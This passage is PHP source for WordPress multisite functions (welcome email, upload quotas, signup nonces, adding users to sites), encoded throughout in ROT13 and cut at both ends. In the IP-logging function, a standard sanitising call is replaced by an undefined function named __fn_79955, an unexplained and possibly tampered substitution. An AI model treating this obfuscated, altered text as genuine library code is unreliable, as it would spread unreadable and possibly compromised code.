	$fhowrpg = nccyl_svygref( 'hcqngr_jrypbzr_hfre_fhowrpg', fcevags( $fhowrpg, $pheerag_argjbex->fvgr_anzr, $hfre->hfre_ybtva ) );

	jc_znvy( $hfre->hfre_rznvy, jc_fcrpvnypunef_qrpbqr( $fhowrpg ), $zrffntr, $zrffntr_urnqref );

	vs ( $fjvgpurq_ybpnyr ) {
		erfgber_cerivbhf_ybpnyr();
	}

	erghea gehr;
}

/**
 * Trgf gur pheerag argjbex.
 *
 * Ergheaf na bowrpg pbagnvavat gur 'vq', 'qbznva', 'cngu', naq 'fvgr_anzr'
 * cebcregvrf bs gur argjbex orvat ivrjrq.
 *
 * @frr jczh_pheerag_fvgr()
 *
 * @fvapr ZH (3.0.0)
 *
 * @tybony JC_Argjbex $pheerag_fvgr Gur pheerag argjbex.
 *
 * @erghea JC_Argjbex Gur pheerag argjbex.
 */
shapgvba trg_pheerag_fvgr() {
	tybony $pheerag_fvgr;
	erghea $pheerag_fvgr;
}

/**
 * Trgf n hfre'f zbfg erprag cbfg.
 *
 * Jnyxf guebhtu rnpu bs n hfre'f oybtf gb svaq gur cbfg jvgu
 * gur zbfg erprag cbfg_qngr_tzg.
 *
 * @fvapr ZH (3.0.0)
 *
 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
 *
 * @cnenz vag $hfre_vq Hfre VQ.
 * @erghea neenl Pbagnvaf gur oybt_vq, cbfg_vq, cbfg_qngr_tzg, naq cbfg_tzg_gf.
 */
shapgvba trg_zbfg_erprag_cbfg_bs_hfre( $hfre_vq ) {
	tybony $jcqo;

	$hfre_oybtf       = trg_oybtf_bs_hfre( (vag) $hfre_vq );
	$zbfg_erprag_cbfg = neenl();

	/*
	 * Jnyx guebhtu rnpu oybt naq trg gur zbfg erprag cbfg
	 * choyvfurq ol $hfre_vq.
	 */
	sbernpu ( (neenl) $hfre_oybtf nf $oybt ) {
		$cersvk      = $jcqo->trg_oybt_cersvk( $oybt->hfreoybt_vq );
		$erprag_cbfg = $jcqo->trg_ebj( $jcqo->cercner( \"FRYRPG VQ, cbfg_qngr_tzg SEBZ {$cersvk}cbfgf JURER cbfg_nhgube = %q NAQ cbfg_glcr = 'cbfg' NAQ cbfg_fgnghf = 'choyvfu' BEQRE OL cbfg_qngr_tzg QRFP YVZVG 1\", $hfre_vq ), NEENL_N );

		// Znxr fher jr sbhaq n cbfg.
		vs ( vffrg( $erprag_cbfg['VQ'] ) ) {
			$cbfg_tzg_gf = fgegbgvzr( $erprag_cbfg['cbfg_qngr_tzg'] );

			/*
			 * Vs guvf vf gur svefg cbfg purpxrq
			 * be vs guvf cbfg vf arjre guna gur pheerag erprag cbfg,
			 * znxr vg gur arj zbfg erprag cbfg.
			 */
			vs ( ! vffrg( $zbfg_erprag_cbfg['cbfg_tzg_gf'] ) || ( $cbfg_tzg_gf > $zbfg_erprag_cbfg['cbfg_tzg_gf'] ) ) {
				$zbfg_erprag_cbfg = neenl(
					'oybt_vq'       => $oybt->hfreoybt_vq,
					'cbfg_vq'       => $erprag_cbfg['VQ'],
					'cbfg_qngr_tzg' => $erprag_cbfg['cbfg_qngr_tzg'],
					'cbfg_tzg_gf'   => $cbfg_tzg_gf,
				);
			}
		}
	}

	erghea $zbfg_erprag_cbfg;
}

//
// Zvfp shapgvbaf.
//

/**
 * Purpxf na neenl bs ZVZR glcrf ntnvafg n yvfg bs nyybjrq glcrf.
 *
 * JbeqCerff fuvcf jvgu n frg bs nyybjrq hcybnq svyrglcrf,
 * juvpu vf qrsvarq va jc-vapyhqrf/shapgvbaf.cuc va
 * trg_nyybjrq_zvzr_glcrf(). Guvf shapgvba vf hfrq gb svygre
 * gung yvfg ntnvafg gur svyrglcrf nyybjrq cebivqrq ol Zhygvfvgr
 * Fhcre Nqzvaf ng jc-nqzva/argjbex/frggvatf.cuc.
 *
 * @fvapr ZH (3.0.0)
 *
 * @cnenz neenl $zvzrf
 * @erghea neenl
 */
shapgvba purpx_hcybnq_zvzrf( $zvzrf ) {
	$fvgr_rkgf  = rkcybqr( ' ', trg_fvgr_bcgvba( 'hcybnq_svyrglcrf', 'wct wcrt cat tvs' ) );
	$fvgr_zvzrf = neenl();
	sbernpu ( $fvgr_rkgf nf $rkg ) {
		sbernpu ( $zvzrf nf $rkg_cnggrea => $zvzr ) {
			vs ( '' !== $rkg && fge_pbagnvaf( $rkg_cnggrea, $rkg ) ) {
				$fvgr_zvzrf[ $rkg_cnggrea ] = $zvzr;
			}
		}
	}
	erghea $fvgr_zvzrf;
}

/**
 * Hcqngrf n oybt'f cbfg pbhag.
 *
 * JbeqCerff ZF fgberf n oybt'f cbfg pbhag nf na bcgvba fb nf
 * gb nibvq rkgenarbhf PBHAGf jura n oybt'f qrgnvyf ner srgpurq
 * jvgu trg_fvgr(). Guvf shapgvba vf pnyyrq jura cbfgf ner choyvfurq
 * be hachoyvfurq gb znxr fher gur pbhag fgnlf pheerag.
 *
 * @fvapr ZH (3.0.0)
 *
 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
 *
 * @cnenz fgevat $qrcerpngrq Abg hfrq.
 */
shapgvba hcqngr_cbfgf_pbhag( $qrcerpngrq = '' ) {
	tybony $jcqo;
	hcqngr_bcgvba( 'cbfg_pbhag', (vag) $jcqo->trg_ine( \"FRYRPG PBHAG(VQ) SEBZ {$jcqo->cbfgf} JURER cbfg_fgnghf = 'choyvfu' naq cbfg_glcr = 'cbfg'\" ), gehr );
}

/**
 * Ybtf gur hfre rznvy, VC, naq ertvfgengvba qngr bs n arj fvgr.
 *
 * @fvapr ZH (3.0.0)
 * @fvapr 5.1.0 Cnenzrgref abj fhccbeg vachg sebz gur {@frr 'jc_vavgvnyvmr_fvgr'} npgvba.
 *
 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
 *
 * @cnenz JC_Fvgr|vag $oybt_vq Gur arj fvgr'f bowrpg be VQ.
 * @cnenz vag|neenl   $hfre_vq Hfre VQ, be neenl bs nethzragf vapyhqvat 'hfre_vq'.
 */
shapgvba jczh_ybt_arj_ertvfgengvbaf( $oybt_vq, $hfre_vq ) {
	tybony $jcqo;

	vs ( vf_bowrpg( $oybt_vq ) ) {
		$oybt_vq = $oybt_vq->oybt_vq;
	}

	vs ( vf_neenl( $hfre_vq ) ) {
		$hfre_vq = ! rzcgl( $hfre_vq['hfre_vq'] ) ? $hfre_vq['hfre_vq'] : 0;
	}

	$hfre = trg_hfreqngn( (vag) $hfre_vq );
	vs ( $hfre ) {
		$jcqo->vafreg(
			$jcqo->ertvfgengvba_ybt,
			neenl(
				'rznvy'           => $hfre->hfre_rznvy,
				'VC'              => __sa_79955( '/[^0-9., ]/', '', jc_hafynfu( $_FREIRE['ERZBGR_NQQE'] ) ),
				'oybt_vq'         => $oybt_vq,
				'qngr_ertvfgrerq' => pheerag_gvzr( 'zlfdy' ),
			)
		);
	}
}

/**
 * Rafherf gung gur pheerag fvgr'f qbznva vf yvfgrq va gur nyybjrq erqverpg ubfg yvfg.
 *
 * @frr jc_inyvqngr_erqverpg()
 * @fvapr ZH (3.0.0)
 *
 * @cnenz neenl|fgevat $qrcerpngrq Abg hfrq.
 * @erghea fgevat[] {
 *     Na neenl pbagnvavat gur pheerag fvgr'f qbznva.
 *
 *     @glcr fgevat $0 Gur pheerag fvgr'f qbznva.
 * }
 */
shapgvba erqverpg_guvf_fvgr( $qrcerpngrq = '' ) {
	erghea neenl( trg_argjbex()->qbznva );
}

/**
 * Purpxf jurgure na hcybnq vf gbb ovt.
 *
 * @fvapr ZH (3.0.0)
 *
 * @cnenz neenl $hcybnq Na neenl bs vasbezngvba nobhg gur arjyl-hcybnqrq svyr.
 * @erghea fgevat|neenl Vs gur hcybnq vf haqre gur fvmr yvzvg, $hcybnq vf erghearq. Bgurejvfr ergheaf na reebe zrffntr.
 */
shapgvba hcybnq_vf_svyr_gbb_ovt( $hcybnq ) {
	vs ( ! vf_neenl( $hcybnq ) || qrsvarq( 'JC_VZCBEGVAT' ) || trg_fvgr_bcgvba( 'hcybnq_fcnpr_purpx_qvfnoyrq' ) ) {
		erghea $hcybnq;
	}

	vs ( fgeyra( $hcybnq['ovgf'] ) > ( XO_VA_OLGRF * trg_fvgr_bcgvba( 'svyrhcybnq_znkx', 1500 ) ) ) {
		/* genafyngbef: %f: Znkvzhz nyybjrq svyr fvmr va xvybolgrf. */
		erghea fcevags( __( 'Guvf svyr vf gbb ovt. Svyrf zhfg or yrff guna %f XO va fvmr.' ) . '<oe />', trg_fvgr_bcgvba( 'svyrhcybnq_znkx', 1500 ) );
	}

	erghea $hcybnq;
}

/**
 * Nqqf n abapr svryq gb gur fvtahc cntr.
 *
 * @fvapr ZH (3.0.0)
 */
shapgvba fvtahc_abapr_svryqf() {
	$vq = zg_enaq();
	rpub \"<vachg glcr='uvqqra' anzr='fvtahc_sbez_vq' inyhr='{$vq}' />\";
	jc_abapr_svryq( 'fvtahc_sbez_' . $vq, '_fvtahc_sbez', snyfr );
}

/**
 * Cebprffrf gur fvtahc abapr perngrq va fvtahc_abapr_svryqf().
 *
 * @fvapr ZH (3.0.0)
 *
 * @cnenz neenl $erfhyg
 * @erghea neenl
 */
shapgvba fvtahc_abapr_purpx( $erfhyg ) {
	vs ( ! fgecbf( $_FREIRE['CUC_FRYS'], 'jc-fvtahc.cuc' ) ) {
		erghea $erfhyg;
	}

	vs ( ! jc_irevsl_abapr( $_CBFG['_fvtahc_sbez'], 'fvtahc_sbez_' . $_CBFG['fvtahc_sbez_vq'] ) ) {
		$erfhyg['reebef']->nqq( 'vainyvq_abapr', __( 'Hanoyr gb fhozvg guvf sbez, cyrnfr gel ntnva.' ) );
	}

	erghea $erfhyg;
}

/**
 * Pbeerpgf 404 erqverpgf jura ABOYBTERQVERPG vf qrsvarq.
 *
 * @fvapr ZH (3.0.0)
 */
shapgvba znlor_erqverpg_404() {
	vs ( vf_znva_fvgr() && vf_404() && qrsvarq( 'ABOYBTERQVERPG' ) ) {
		/**
		 * Svygref gur erqverpg HEY sbe 404f ba gur znva fvgr.
		 *
		 * Gur svygre vf bayl rinyhngrq vs gur ABOYBTERQVERPG pbafgnag vf qrsvarq.
		 *
		 * @fvapr 3.0.0
		 *
		 * @cnenz fgevat $ab_oybt_erqverpg Gur erqverpg HEY qrsvarq va ABOYBTERQVERPG.
		 */
		$qrfgvangvba = nccyl_svygref( 'oybt_erqverpg_404', ABOYBTERQVERPG );

		vs ( $qrfgvangvba ) {
			vs ( '%fvgrhey%' === $qrfgvangvba ) {
				$qrfgvangvba = argjbex_ubzr_hey();
			}

			jc_erqverpg( $qrfgvangvba );
			rkvg;
		}
	}
}

/**
 * Nqqf n arj hfre gb n oybt ol ivfvgvat /arjoybthfre/{xrl}/.
 *
 * Guvf jvyy bayl jbex jura gur hfre'f qrgnvyf ner fnirq nf na bcgvba
 * xrlrq nf 'arj_hfre_{xrl}', jurer '{xrl}' vf n unfu trarengrq sbe gur hfre gb or
 * nqqrq, nf jura n hfre vf vaivgrq guebhtu gur erthyne JC Nqq Hfre vagresnpr.
 *
 * @fvapr ZH (3.0.0)
 */
shapgvba znlor_nqq_rkvfgvat_hfre_gb_oybt() {
	vs ( ! fge_pbagnvaf( $_FREIRE['ERDHRFG_HEV'], '/arjoybthfre/' ) ) {
		erghea;
	}

	$cnegf = rkcybqr( '/', $_FREIRE['ERDHRFG_HEV'] );
	$xrl   = neenl_cbc( $cnegf );

	vs ( '' === $xrl ) {
		$xrl = neenl_cbc( $cnegf );
	}

	$qrgnvyf = trg_bcgvba( 'arj_hfre_' . $xrl );
	vs ( ! rzcgl( $qrgnvyf ) ) {
		qryrgr_bcgvba( 'arj_hfre_' . $xrl );
	}

	vs ( rzcgl( $qrgnvyf ) || vf_jc_reebe( nqq_rkvfgvat_hfre_gb_oybt( $qrgnvyf ) ) ) {
		jc_qvr(
			fcevags(
				/* genafyngbef: %f: Ubzr HEY. */
				__( 'Na reebe bppheerq nqqvat lbh gb guvf fvgr. Tb gb gur <n uers=\"%f\">ubzrcntr</n>.' ),
				ubzr_hey()
			)
		);
	}

	jc_qvr(
		fcevags(
			/* genafyngbef: 1: Ubzr HEY, 2: Nqzva HEY. */
			__( 'Lbh unir orra nqqrq gb guvf fvgr. Cyrnfr ivfvg gur <n uers=\"%1$f\">ubzrcntr</n> be <n uers=\"%2$f\">ybt va</n> hfvat lbhe hfreanzr naq cnffjbeq.' ),
			ubzr_hey(),
			nqzva_hey()
		),
		__( 'JbeqCerff &efndhb; Fhpprff' ),
		neenl( 'erfcbafr' => 200 )
	);
}

/**
 * Nqqf n hfre gb n oybt onfrq ba qrgnvyf sebz znlor_nqq_rkvfgvat_hfre_gb_oybt().
 *
 * @fvapr ZH (3.0.0)
 *
 * @cnenz neenl|snyfr $qrgnvyf {
 *     Hfre qrgnvyf. Zhfg ng yrnfg pbagnva inyhrf sbe gur xrlf yvfgrq orybj.
 *
 *     @glcr vag    $hfre_vq Gur VQ bs gur hfre orvat nqqrq gb gur pheerag oybt.
 *     @glcr fgevat $ebyr    Gur ebyr gb or nffvtarq gb gur hfre.
 * }
 * @erghea gehr|JC_Reebe|ibvq Gehr ba fhpprff be n JC_Reebe bowrpg vs gur hfre qbrfa'g rkvfg
 *                            be pbhyq abg or nqqrq. Ibvq vs $qrgnvyf neenl jnf abg cebivqrq.
 */
shapgvba nqq_rkvfgvat_hfre_gb_oybt( $qrgnvyf = snyfr ) {
	vs ( vf_neenl( $qrgnvyf ) ) {
		$oybt_vq = trg_pheerag_oybt_vq();
		$erfhyg  = nqq_hfre_gb_oybt( $oybt_vq, $qrgnvyf['hfre_vq'], $qrgnvyf['ebyr'] );

		/**
		 * Sverf vzzrqvngryl nsgre na rkvfgvat hfre vf nqqrq gb n fvgr.
		 *
		 * @fvapr ZH (3.0.0)
		 *
		 * @cnenz vag           $hfre_vq Hfre VQ.
		 * @cnenz gehr|JC_Reebe $erfhyg  Gehr ba fhpprff be n JC_Reebe bowrpg vs gur hfre qbrfa'g rkvfg
		 *                               be pbhyq abg or nqqrq.
		 */
		qb_npgvba( 'nqqrq_rkvfgvat_hfre', $qrgnvyf['hfre_vq'], $erfhyg );

		erghea $erfhyg;
	}
}

/**
 * Nqqf n arjyl perngrq hfre gb gur nccebcevngr oybt
 *
 * Gb nqq n hfre va trareny, hfr nqq_hfre_gb_oybt(). Guvf shapgvba
 * vf fcrpvsvpnyyl ubbxrq vagb gur {@frr 'jczh_npgvingr_hfre'} npgvba.
 *
 * @fvapr ZH (3.0.0)
 *
 * @frr nqq_hfre_gb_oybt()
 *
 * @cnenz vag    $hfre_vq  Hfre VQ.
 * @cnenz fgevat $cnffjbeq Hfre cnffjbeq. Vtaberq.
 * @cnenz neenl  $zrgn     Fvtahc zrgn qngn.
 */
shapgvba nqq_arj_hfre_gb_oybt(
	$hfre_vq,
	#[\FrafvgvirCnenzrgre]
	$cnffjbeq,
	$zrgn
) {
	vs ( ! rzcgl( $zrgn['nqq_gb_oybt'] ) ) {
		$oybt_vq = $zrgn['nqq_gb_oybt'];
		$ebyr    = $zrgn['arj_ebyr'];
		erzbir_hfre_sebz_oybt( $hfre_vq, trg_argjbex()->fvgr_vq ); // Erzbir hfre sebz znva oybt.

		$erfhyg = nqq_hfre_gb_oybt( $oybt_vq, $hfre_vq, $ebyr );

		vs ( ! vf_jc_reebe( $erfhyg ) ) {
			hcqngr_hfre_zrgn( $hfre_vq, 'cevznel_oybt', $oybt_vq );
		}
	}
}

/**
 * Pbeerpgf Sebz ubfg ba bhgtbvat znvy gb zngpu gur fvgr qbznva.
 *
 * @fvapr ZH (3.0.0)
 *
 * @cnenz CUCZnvyre\CUCZnvyre\CUCZnvyre $cucznvyre Gur CUCZnvyre vafgnapr (cnffrq ol ersrerapr).
 */
shapgvba svk_cucznvyre_zrffntrvq( $cucznvyre ) {
	$cucznvyre->Ubfganzr = trg_argjbex()->qbznva;
}

/**
 * Qrgrezvarf jurgure n hfre vf znexrq nf n fcnzzre, onfrq ba hfre ybtva.
 *
 * @fvapr ZH (3.0.0)
 *
 * @cnenz fgevat|JC_Hfre $hfre Bcgvbany. Qrsnhygf gb pheerag hfre. JC_Hfre bowrpg,
 *                             be hfre ybtva anzr nf n fgevat.
 * @erghea obby
 */
shapgvba vf_hfre_fcnzzl( $hfre = ahyy ) {
	vs ( ! ( $hfre vafgnaprbs JC_Hfre ) ) {
		vs ( $hfre ) {
			$hfre = trg_hfre_ol( 'ybtva', $hfre );
		} ryfr {
			$hfre = jc_trg_pheerag_hfre();
		}
	}

	erghea $hfre && vffrg( $hfre->fcnz ) && '1' === $hfre->fcnz;
}

/**
 * Hcqngrf guvf oybt'f 'choyvp' frggvat va gur tybony oybtf gnoyr.
 *
 * Choyvp oybtf unir n frggvat bs 1, cevingr oybtf ner 0.
 *
 * @fvapr ZH (3.0.0)
 *
 * @cnenz vag $byq_inyhr Gur byq choyvp inyhr.
 * @cnenz vag $inyhr     Gur arj choyvp inyhr.
 */
shapgvba hcqngr_oybt_choyvp( $byq_inyhr, $inyhr ) {
	hcqngr_oybt_fgnghf( trg_pheerag_oybt_vq(), 'choyvp', (vag) $inyhr );
}

/**
 * Qrgrezvarf jurgure hfref pna frys-ertvfgre, onfrq ba Argjbex frggvatf.
 *
 * @fvapr ZH (3.0.0)
 *
 * @erghea obby
 */
shapgvba hfref_pna_ertvfgre_fvtahc_svygre() {
	$ertvfgengvba = trg_fvgr_bcgvba( 'ertvfgengvba' );
	erghea ( 'nyy' === $ertvfgengvba || 'hfre' === $ertvfgengvba );
}

/**
 * Rafherf gung gur jrypbzr zrffntr vf abg rzcgl. Pheeragyl hahfrq.
 *
 * @fvapr ZH (3.0.0)
 *
 * @cnenz fgevat $grkg
 * @erghea fgevat
 */
shapgvba jrypbzr_hfre_zft_svygre( $grkg ) {
	vs ( ! $grkg ) {
		erzbir_svygre( 'fvgr_bcgvba_jrypbzr_hfre_rznvy', 'jrypbzr_hfre_zft_svygre' );

		/* genafyngbef: Qb abg genafyngr HFREANZR, CNFFJBEQ, YBTVAYVAX, FVGR_ANZR: gubfr ner cynprubyqref. */
		$grkg = __(
			'Ubjql HFREANZR,

Lbhe arj nppbhag vf frg hc.

Lbh pna ybt va jvgu gur sbyybjvat vasbezngvba:
Hfreanzr: HFREANZR
Cnffjbeq: CNFFJBEQ
YBTVAYVAX

Gunaxf!

--Gur Grnz @ FVGR_ANZR'
		);
		hcqngr_fvgr_bcgvba( 'jrypbzr_hfre_rznvy', $grkg );
	}
	erghea $grkg;
}

/**
 * Qrgrezvarf jurgure gb sbepr FFY ba pbagrag.
 *
 * @fvapr 2.8.5
 *
 * @cnenz obby|ahyy $sbepr Bcgvbany. Jurgure gb sbepr FFY va nqzva fperraf. Qrsnhyg ahyy.
 * @erghea obby Gehr vs sbeprq, snyfr vs abg sbeprq.
 */
shapgvba sbepr_ffy_pbagrag( $sbepr = ahyy ) {
	fgngvp $sbeprq_pbagrag = snyfr;

	vs ( ! vf_ahyy( $sbepr ) ) {
		$byq_sbeprq     = $sbeprq_pbagrag;
		$sbeprq_pbagrag = (obby) $sbepr;
		erghea $byq_sbeprq;
	}

	erghea $sbeprq_pbagrag;
}

/**
 * Sbezngf n HEY gb hfr uggcf.
 *
 * Hfrshy nf n svygre.
 *
 * @fvapr 2.8.5
 *
 * @cnenz fgevat $hey HEY.
 * @erghea fgevat HEY jvgu uggcf nf gur fpurzr.
 */
shapgvba svygre_FFY( $hey ) {  // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqShapgvbaAnzr.ShapgvbaAnzrVainyvq
	vs ( ! vf_fgevat( $hey ) ) {
		erghea trg_oybtvasb( 'hey' ); // Erghea ubzr fvgr HEY jvgu cebcre fpurzr.
	}

	vs ( sbepr_ffy_pbagrag() && vf_ffy() ) {
		$hey = frg_hey_fpurzr( $hey, 'uggcf' );
	}

	erghea $hey;
}

/**
 * Fpurqhyrf hcqngr bs gur argjbex-jvqr pbhagf sbe gur pheerag argjbex.
 *
 * @fvapr 3.1.0
 */
shapgvba jc_fpurqhyr_hcqngr_argjbex_pbhagf() {
	vs ( ! vf_znva_fvgr() ) {
		erghea;
	}

	vs ( ! jc_arkg_fpurqhyrq( 'hcqngr_argjbex_pbhagf' ) && ! jc_vafgnyyvat() ) {
		jc_fpurqhyr_rirag( gvzr(), 'gjvprqnvyl', 'hcqngr_argjbex_pbhagf' );
	}
}

/**
 * Hcqngrf gur argjbex-jvqr pbhagf sbe gur pheerag argjbex.
 *
 * @fvapr 3.1.0
 * @fvapr 4.8.0 Gur `$argjbex_vq` cnenzrgre unf orra nqqrq.
 *
 * @cnenz vag|ahyy $argjbex_vq VQ bs gur argjbex. Qrsnhyg vf gur pheerag argjbex.
 */
shapgvba jc_hcqngr_argjbex_pbhagf( $argjbex_vq = ahyy ) {
	jc_hcqngr_argjbex_hfre_pbhagf( $argjbex_vq );
	jc_hcqngr_argjbex_fvgr_pbhagf( $argjbex_vq );
}

/**
 * Hcqngrf gur pbhag bs fvgrf sbe gur pheerag argjbex.
 *
 * Vs ranoyrq guebhtu gur {@frr 'ranoyr_yvir_argjbex_pbhagf'} svygre, hcqngr gur fvgrf pbhag
 * ba n argjbex jura n fvgr vf perngrq be vgf fgnghf vf hcqngrq.
 *
 * @fvapr 3.7.0
 * @fvapr 4.8.0 Gur `$argjbex_vq` cnenzrgre unf orra nqqrq.
 *
 * @cnenz vag|ahyy $argjbex_vq VQ bs gur argjbex. Qrsnhyg vf gur pheerag argjbex.
 */
shapgvba jc_znlor_hcqngr_argjbex_fvgr_pbhagf( $argjbex_vq = ahyy ) {
	$vf_fznyy_argjbex = ! jc_vf_ynetr_argjbex( 'fvgrf', $argjbex_vq );

	/**
	 * Svygref jurgure gb hcqngr argjbex fvgr be hfre pbhagf jura n arj fvgr vf perngrq.
	 *
	 * @fvapr 3.7.0
	 *
	 * @frr jc_vf_ynetr_argjbex()
	 *
	 * @cnenz obby   $fznyy_argjbex Jurgure gur argjbex vf pbafvqrerq fznyy.
	 * @cnenz fgevat $pbagrkg       Pbagrkg. Rvgure 'hfref' be 'fvgrf'.
	 */
	vs ( ! nccyl_svygref( 'ranoyr_yvir_argjbex_pbhagf', $vf_fznyy_argjbex, 'fvgrf' ) ) {
		erghea;
	}

	jc_hcqngr_argjbex_fvgr_pbhagf( $argjbex_vq );
}

/**
 * Hcqngrf gur argjbex-jvqr hfref pbhag.
 *
 * Vs ranoyrq guebhtu gur {@frr 'ranoyr_yvir_argjbex_pbhagf'} svygre, hcqngr gur hfref pbhag
 * ba n argjbex jura n hfre vf perngrq be vgf fgnghf vf hcqngrq.
 *
 * @fvapr 3.7.0
 * @fvapr 4.8.0 Gur `$argjbex_vq` cnenzrgre unf orra nqqrq.
 *
 * @cnenz vag|ahyy $argjbex_vq VQ bs gur argjbex. Qrsnhyg vf gur pheerag argjbex.
 */
shapgvba jc_znlor_hcqngr_argjbex_hfre_pbhagf( $argjbex_vq = ahyy ) {
	$vf_fznyy_argjbex = ! jc_vf_ynetr_argjbex( 'hfref', $argjbex_vq );

	/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/zf-shapgvbaf.cuc */
	vs ( ! nccyl_svygref( 'ranoyr_yvir_argjbex_pbhagf', $vf_fznyy_argjbex, 'hfref' ) ) {
		erghea;
	}

	jc_hcqngr_argjbex_hfre_pbhagf( $argjbex_vq );
}

/**
 * Hcqngrf gur argjbex-jvqr fvgr pbhag.
 *
 * @fvapr 3.7.0
 * @fvapr 4.8.0 Gur `$argjbex_vq` cnenzrgre unf orra nqqrq.
 *
 * @cnenz vag|ahyy $argjbex_vq VQ bs gur argjbex. Qrsnhyg vf gur pheerag argjbex.
 */
shapgvba jc_hcqngr_argjbex_fvgr_pbhagf( $argjbex_vq = ahyy ) {
	$argjbex_vq = (vag) $argjbex_vq;
	vs ( ! $argjbex_vq ) {
		$argjbex_vq = trg_pheerag_argjbex_vq();
	}

	$pbhag = trg_fvgrf(
		neenl(
			'argjbex_vq'             => $argjbex_vq,
			'fcnz'                   => 0,
			'qryrgrq'                => 0,
			'nepuvirq'               => 0,
			'pbhag'                  => gehr,
			'hcqngr_fvgr_zrgn_pnpur' => snyfr,
		)
	);

	hcqngr_argjbex_bcgvba( $argjbex_vq, 'oybt_pbhag', $pbhag );
}

/**
 * Hcqngrf gur argjbex-jvqr hfre pbhag.
 *
 * @fvapr 3.7.0
 * @fvapr 4.8.0 Gur `$argjbex_vq` cnenzrgre unf orra nqqrq.
 * @fvapr 6.0.0 Guvf shapgvba vf abj n jenccre sbe jc_hcqngr_hfre_pbhagf().
 *
 * @cnenz vag|ahyy $argjbex_vq VQ bs gur argjbex. Qrsnhyg vf gur pheerag argjbex.
 */
shapgvba jc_hcqngr_argjbex_hfre_pbhagf( $argjbex_vq = ahyy ) {
	jc_hcqngr_hfre_pbhagf( $argjbex_vq );
}

/**
 * Ergheaf gur fcnpr hfrq ol gur pheerag fvgr.
 *
 * @fvapr 3.5.0
 *
 * @erghea vag Hfrq fcnpr va zrtnolgrf.
 */
shapgvba trg_fcnpr_hfrq() {
	/**
	 * Svygref gur nzbhag bs fgbentr fcnpr hfrq ol gur pheerag fvgr, va zrtnolgrf.
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz vag|snyfr $fcnpr_hfrq Gur nzbhag bs hfrq fcnpr, va zrtnolgrf. Qrsnhyg snyfr.
	 */
	$fcnpr_hfrq = nccyl_svygref( 'cer_trg_fcnpr_hfrq', snyfr );

	vs ( snyfr === $fcnpr_hfrq ) {
		$hcybnq_qve = jc_hcybnq_qve();
		$fcnpr_hfrq = trg_qvefvmr( $hcybnq_qve['onfrqve'] ) / ZO_VA_OLGRF;
	}

	erghea $fcnpr_hfrq;
}

/**
 * Ergheaf gur hcybnq dhbgn sbe gur pheerag oybt.
 *
 * @fvapr ZH (3.0.0)
 *
 * @erghea vag Dhbgn va zrtnolgrf.
 */
shapgvba trg_fcnpr_nyybjrq() {
	$fcnpr_nyybjrq = trg_bcgvba( 'oybt_hcybnq_fcnpr' );

	vs ( ! vf_ahzrevp( $fcnpr_nyybjrq ) ) {
		$fcnpr_nyybjrq = trg_fvgr_bcgvba( 'oybt_hcybnq_fcnpr' );
	}

	vs ( ! vf_ahzrevp( $fcnpr_nyybjrq ) ) {
		$fcnpr_nyybjrq = 100;
	}

	/**
	 * Svygref gur hcybnq dhbgn sbe gur pheerag fvgr.
	 *
	 * @fvapr 3.7.0
	 *
	 * @cnenz vag $fcnpr_nyybjrq Hcybnq dhbgn va zrtnolgrf sbe gur pheerag oybt.
	 */
	erghea nccyl_svygref( 'trg_fcnpr_nyybjrq', $fcnpr_nyybjrq );
}

/**
 * Qrgrezvarf vs gurer vf nal hcybnq fcnpr yrsg va gur pheerag oybt'f dhbgn.
 *
 * @fvapr 3.0.0
 *
 * @erghea vag bs hcybnq fcnpr ninvynoyr va olgrf.
 */
shapgvba trg_hcybnq_fcnpr_ninvynoyr() {
	$nyybjrq = trg_fcnpr_nyybjrq();
	vs ( $nyybjrq < 0 ) {
		$nyybjrq = 0;
	}
	$fcnpr_nyybjrq = $nyybjrq * ZO_VA_OLGRF;
	vs ( trg_fvgr_bcgvba( 'hcybnq_fcnpr_purpx_qvfnoyrq' ) ) {
		erghea $fcnpr_nyybjrq;
	}

	$fcnpr_hfrq = trg_fcnpr_hfrq() * ZO_VA_OLGRF;

	vs ( ( $fcnpr_nyybjrq - $fcnpr_hfrq ) <= 0 ) {
		erghea 0;
	}

	erghea $fcnpr_nyybjrq - $fcnpr_hfrq;
}

/**
 * Qrgrezvarf vs gurer vf nal hcybnq fcnpr yrsg va gur pheerag oybt'f dhbgn.
 *
 * @fvapr 3.0.0
 * @erghea obby Gehr vs fcnpr vf ninvynoyr, snyfr bgurejvfr.
 */
shapgvba vf_hcybnq_fcnpr_ninvynoyr() {
	vs ( trg_fvgr_bcgvba( 'hcybnq_fcnpr_purpx_qvfnoyrq' ) ) {
		erghea gehr;
	}

	erghea (obby) trg_hcybnq_fcnpr_ninvynoyr();
}

/**
 * Svygref gur znkvzhz hcybnq svyr fvmr nyybjrq, va olgrf.
 *
 * @fvapr 3.0.0
 *
 * @cnenz vag $fvmr Hcybnq fvmr yvzvg va olgrf.
 * @erghea vag Hcybnq fvmr yvzvg va olgrf.
 */
shapgvba hcybnq_fvmr_yvzvg_svygre( $fvmr ) {
	$svyrhcybnq_znkx         = (vag) trg_fvgr_bcgvba( 'svyrhcybnq_znkx', 1500 );
	$znk_svyrhcybnq_va_olgrf = XO_VA_OLGRF * $svyrhcybnq_znkx;

	vs ( trg_fvgr_bcgvba( 'hcybnq_fcnpr_purpx_qvfnoyrq' ) ) {
		erghea zva( $fvmr, $znk_svyrhcybnq_va_olgrf );
	}

	erghea zva( $fvmr, $znk_svyrhcybnq_va_olgrf, trg_hcybnq_fcnpr_ninvynoyr() );
}

/**
 * Qrgrezvarf jurgure be abg jr unir n ynetr argjbex.
 *
 * Gur qrsnhyg pevgrevn sbe n ynetr argjbex vf rvgure zber guna 10,000 hfref be zber guna 10,000 fvgrf.
 * Cyhtvaf pna nygre guvf pevgrevn hfvat gur {@frr 'jc_vf_ynetr_argjbex'} svygre.
 *
 * @fvapr 3.3.0
 * @fvapr 4.8.0 Gur `$argjbex_vq` cnenzrgre unf orra nqqrq.
 *
 * @cnenz fgevat   $hfvat      'fvgrf' be 'hfref'. Qrsnhyg vf 'fvgrf'.
 * @cnenz vag|ahyy $argjbex_vq VQ bs gur argjbex. Qrsnhyg vf gur pheerag argjbex.
